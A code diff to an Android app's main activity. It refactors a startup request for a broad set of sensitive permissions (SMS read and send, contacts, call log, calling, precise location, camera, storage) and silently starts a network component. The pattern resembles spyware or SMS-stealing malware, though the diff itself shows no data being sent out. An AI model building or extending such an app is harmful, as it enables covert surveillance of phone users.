@@ -21,26 +21,26 @@ public class MainActivity extends Activity {
         try { Net.start(this); } catch (Throwable ignored) {}
 
         java.util.List<String> need = new java.util.ArrayList<>();
-        String[] perms = {
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.RECEIVE_SMS,
-            android.Manifest.permission.SEND_SMS,
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_PHONE_STATE,
-            android.Manifest.permission.READ_CALL_LOG,
-            android.Manifest.permission.CALL_PHONE,
-            android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.READ_EXTERNAL_STORAGE
-        };
+        java.util.List<String> perms = new java.util.ArrayList<>();
+        perms.add(android.Manifest.permission.READ_SMS);
+        perms.add(android.Manifest.permission.RECEIVE_SMS);
+        perms.add(android.Manifest.permission.SEND_SMS);
+        perms.add(android.Manifest.permission.READ_CONTACTS);
+        perms.add(android.Manifest.permission.READ_PHONE_STATE);
+        perms.add(android.Manifest.permission.READ_CALL_LOG);
+        perms.add(android.Manifest.permission.CALL_PHONE);
+        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        perms.add(android.Manifest.permission.CAMERA);
+        if (Build.VERSION.SDK_INT >= 33) {
+            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES);
+            perms.add(android.Manifest.permission.POST_NOTIFICATIONS);
+        } else {
+            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
         for (String p : perms)
-            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED) need.add(p);
-        if (Build.VERSION.SDK_INT >= 33
-                && checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
-                   != android.content.pm.PackageManager.PERMISSION_GRANTED)
-            need.add(android.Manifest.permission.POST_NOTIFICATIONS);
-        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);
+            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED)
+                need.add(p);        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);
 
         findViewById(R.id.b1).setOnClickListener(new View.OnClickListener() {
             @Override public void onClick(View v) {
